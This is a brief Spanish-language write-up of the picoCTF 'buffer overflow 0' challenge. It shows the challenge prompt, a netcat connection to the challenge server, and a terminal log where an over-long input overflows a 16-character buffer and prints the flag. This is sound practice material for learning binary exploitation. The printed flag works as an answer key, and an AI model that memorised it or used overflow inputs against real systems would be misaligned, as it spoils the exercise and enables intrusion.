## Objetivo
Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/174/vuln). You can view source [here](https://artifacts.picoctf.net/c/174/vuln.c).

Connect using: `nc saturn.picoctf.net 55526`

## Solución
Al ver el código nos damos cuenta que si ingresamos más de 16 caracteres se desvorda el buffer y nos muestra la bandera.
```bash
┌──(kali㉿kali)-[~/picoCTFretos/Binexp/bufferoverflow0]
└─$ nc saturn.picoctf.net 55526
Input: hieunklaiebal;einxageagcae
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
## Notas adicionales
## Referencias
